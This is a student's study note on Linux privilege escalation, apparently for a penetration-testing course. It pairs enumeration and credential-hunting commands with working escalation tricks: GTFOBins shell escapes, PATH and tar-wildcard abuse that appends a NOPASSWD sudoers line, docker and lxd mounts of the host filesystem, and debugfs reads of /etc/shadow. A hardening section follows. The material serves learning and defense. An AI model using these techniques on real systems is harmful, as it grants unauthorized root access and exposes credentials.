# Linux Privilege Escalation

> Status: 🟨 In progress
> Date started: 2026-10-26
> Date finished: 

## 1. Goal
Escalate from a low-priv shell to root on Linux by finding misconfigurations. The enumeration checks below are *both* the attacker's privesc hunt and the defender's hardening audit — same checks, opposite goals.

## Privilege-escalation enumeration (quick checks)
Run these right after landing a shell (automate with linpeas.sh / LinEnum):
```bash
id ; sudo -l                               # my rights + what I can run as root (biggest win)
find / -perm -4000 2>/dev/null             # SUID binaries (check GTFOBins)
find / -perm -2000 2>/dev/null             # SGID
find / -perm -o+w -type f 2>/dev/null      # world-writable files
find / -perm -o+w -type d 2>/dev/null      # world-writable dirs
crontab -l ; sudo crontab -l ; cat /etc/crontab ; ls -la /etc/cron.*   # cron jobs (writable script = root)
cat ~/.bash_history ; ls -la ~             # creds/history
cat /etc/passwd ; cat /etc/group           # users/groups
ldd <binary>                               # hijackable shared libs
sestatus                                   # SELinux on/off
cat /etc/os-release ; uname -a             # version → kernel exploits
```
> `sudo -l`, writable cron scripts, and abusable SUID (via **GTFOBins**) are the three most common quick wins. Always check these first.

## Deep enumeration (what to collect)
Beyond the quick checks — automate with **linpeas.sh** but know the manual commands:
```bash
# environment
whoami; id; hostname; ip a; env; cat /etc/os-release; echo $PATH
# defenses
iptables -L; sestatus; apparmor_status; ufw status; fail2ban-client status
# users / login
cat /etc/passwd; cat /etc/group; getent group sudo; lastlog; w; history
# drives / shares / mounts
lsblk; cat /etc/fstab; showmount -e <host>; cat /etc/exports
# processes (catch root cron/jobs live)
ps aux | grep root
./pspy64 -pf -i 1000            # watch processes/cron without root
# installed packages vs GTFOBins (auto-flag abusable binaries)
apt list --installed 2>/dev/null | cut -d/ -f1 > pkgs.list
# cross-ref pkgs.list against gtfobins.github.io
```

### Credential hunting (where secrets hide)
```bash
grep -riE 'password|passwd|user|secret|api[_-]?key' /var/www /etc /opt /home 2>/dev/null
find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.bak" -o -name "*.xml" -o -name "*.sql" \) 2>/dev/null
grep -iE 'password|pass' ~/.bash_history
# SSH keys
find / -name id_rsa 2>/dev/null ; ls -la ~/.ssh ; cat ~/.ssh/known_hosts
```

## Privilege-escalation techniques (reference)
| Vector | How | 
|---|---|
| **sudo -l** | any allowed binary → check **GTFOBins** for the root-shell trick; `sudo <bin>` |
| **SUID/SGID** | `find / -perm -4000` → GTFOBins the binary |
| **sudo tcpdump** | `-z` postrotate runs a script as root |
| **Writable cron script** | edit the script a root cron runs |
| **PATH hijack** | writable dir in PATH + a script calling a bare binary → drop a malicious one; `PATH=.:$PATH` |
| **LD_PRELOAD** | `sudo LD_PRELOAD=/tmp/x.so <allowed cmd>` loads your lib as root (if env_keep) |
| **Shared-library hijack** | `ldd <bin>` / `readelf -d <bin>|grep PATH` → writable RUNPATH → drop a malicious `.so` |
| **LXD/LXC group** | import image → privileged container → mount host `/` → read root |
| **NFS no_root_squash** | mount the share, create a SUID root binary on it, run it on the target |
| **Kernel exploit** | `uname -a` → matching CVE (e.g. DirtyPipe/DirtyCow); `gcc exploit.c -o x` — last resort, can crash the box |

> Order of attack: `sudo -l` → SUID+GTFOBins → cron → writable files/PATH → then the exotic stuff (LD_PRELOAD, LXD, NFS) → kernel exploit last (riskiest). pspy is the secret weapon — it reveals root cron jobs and processes you can't see otherwise.

## Path abuse (detail)
If a script/SUID binary calls a command by **bare name** (not full path) and you can write to a dir in `$PATH` (or prepend `.`), drop a malicious binary with that name:
```bash
echo $PATH                         # look for a writable dir, or one you control
PATH=.:$PATH ; export PATH          # prepend current dir
echo '/bin/bash' > ls ; chmod +x ls # now a script calling 'ls' runs your bash
```

## Wildcard abuse (tar / chown / chmod)
When a **root cron/script** runs a command with a `*` wildcard in a dir you can write to, create files whose *names* become command flags. Classic `tar` example (tar treats `--checkpoint-action` as an arg):
```bash
echo 'echo "<user> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
# when the root `tar *` cron fires, shell.sh runs as root → then: sudo su
```
Same idea abuses `chown`/`chmod`/`rsync` wildcards. Find the vulnerable job with **pspy**.

## Escaping restricted shells (rbash/rksh)
Goal: break out of a limited shell into a full one.
```bash
# 1. enumerate what's allowed
echo $PATH; env; ls /usr/bin   # which binaries can I run?
# 2. try command substitution / chaining (if not blocked)
ls -l $(pwd) ; ls; id ; cmd1 && cmd2
# 3. env manipulation
export PATH=/bin:/usr/bin ; export SHELL=/bin/bash ; $SHELL
# 4. escape via an allowed binary (check GTFOBins for each):
vi          #  :!/bin/sh   or  :set shell=/bin/bash :shell
less /etc/passwd   # then  !/bin/sh
man man            # then  !/bin/sh
awk 'BEGIN{system("/bin/sh")}'
python3 -c 'import os;os.system("/bin/bash")'
perl -e 'exec "/bin/sh";'
find / -exec /bin/sh \; -quit
nmap --interactive   # then  !sh   (old nmap)
```
> Restricted-shell escape = "which allowed binary has a GTFOBins shell-escape?" Enumerate the allowed commands, then look each up. `vi`/`less`/`awk`/any scripting language almost always works.

## SUID / SGID (detail)
`setuid` runs a binary as its **owner** (root = root privs); shows as `-rwsr-xr-x`. `setgid` = group's privs.
```bash
find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null     # SUID
find / -perm -2000 -exec ls -ldb {} \; 2>/dev/null     # SGID
```
For each unusual binary → **GTFOBins** for the SUID escape (use the `-p` variant to keep euid):
```bash
find / -exec /bin/sh -p \; -quit     # if find is SUID
vim -c ':!/bin/sh'                    # if vim is SUID
less /etc/passwd    # then !/bin/sh
```

## Sudo rights abuse
```bash
sudo -l                               # the single most important check
```
- **GTFOBins binaries** allowed via sudo → instant root: `sudo vim -c ':!/bin/sh'`, `sudo awk 'BEGIN{system("/bin/sh")}'`, `sudo find . -exec /bin/bash \;`, `sudo zip -TT 'sh #' /dev/null`, `sudo less /etc/passwd` then `!sh`.
- **Command without absolute path** in sudoers → PATH-hijack it: drop a malicious binary of that name in a writable `$PATH` dir (e.g. one that does `cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash`, then `/tmp/rootbash -p`).
- **sudo tcpdump `-z`** runs a postrotate *script as root* — point it at your script (reverse-shell payload not stored here; the mechanism is "root runs my script").
- **sudo tar/rsync with wildcards** → the wildcard-abuse trick (above) to append a NOPASSWD sudoers line.
- **sudo systemctl** → it can start a unit that runs an arbitrary `ExecStart` as root.
Harden: `visudo -c`, absolute paths, no blanket `ALL`, minimal NOPASSWD.

## Privileged group abuse
| Group | Escalation |
|---|---|
| **lxd / lxc** | import a small image → `lxc init ... -c security.privileged=true` → mount host `/` into the container → read/write root files |
| **docker** | `docker run -v /:/mnt -it <img>` → host filesystem mounted as root inside the container |
| **disk** | `debugfs /dev/sda1` → read any file (e.g. /etc/shadow) raw, bypassing permissions |
| **adm** | read `/var/log/*` (auth.log, syslog, apache) → creds/tokens in logs |

## Linux capabilities
Capabilities = fine-grained slices of root. A binary granted a dangerous one = privesc.
```bash
getcap -r / 2>/dev/null
find /usr/bin /usr/sbin /usr/local/bin -type f -exec getcap {} \; 2>/dev/null
cat /proc/self/status | grep Cap        # my capability sets
```
Dangerous caps and abuse:
- **cap_setuid** → a tiny libcap program that calls `setuid(0)` then execs a shell = root (PoC source not stored; the point is the cap grants root).
- **cap_dac_override** → bypass file permission checks: read/overwrite `/etc/shadow`, `/etc/passwd`, or a SUID binary (e.g. via `vim.basic` with that cap).
- **cap_sys_admin** → mount, broad admin ops.
Harden: least privilege for caps, audit with `getcap -r /`, `auditd` on setcap/capset.

> The whole module reduces to a priority list: `sudo -l` → SUID+GTFOBins → **capabilities (getcap)** → privileged groups (id) → cron/wildcards → kernel last. `getcap -r /` is the check people forget — a `cap_setuid` binary is as good as a SUID root one.

## Linux hardening (defense / report side)
- **Patching:** automate — `unattended-upgrades` (Debian/Ubuntu), `yum-cron`/`dnf-automatic` (RHEL).
- **Config:** audit SUID/SGID + world-writable; absolute paths in cron/sudo; no creds in files/history; remove unused packages/services; SELinux or AppArmor enforcing.
- **Users:** least privilege for sudo, limit admins, strong password policy (`/etc/login.defs`), monitor `/var/log/auth.log`.
- **Audit:** baseline against **DISA STIGs** / CIS Benchmarks; map to ISO 27001 / PCI-DSS / HIPAA; run **Lynis** (`./lynis audit system` → hardening index + suggestions).
- **Beyond:** file-integrity monitoring, centralized logging, kernel/network hardening, container hardening, security-awareness training.

> Same table, two readers: an attacker runs `find / -perm -4000` to exploit SUID; a defender runs it to remove the unneeded ones. Knowing both makes the privesc finding *and* its fix easy to write up.

## My notes / lab output
Filled in as I run these on lab targets.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
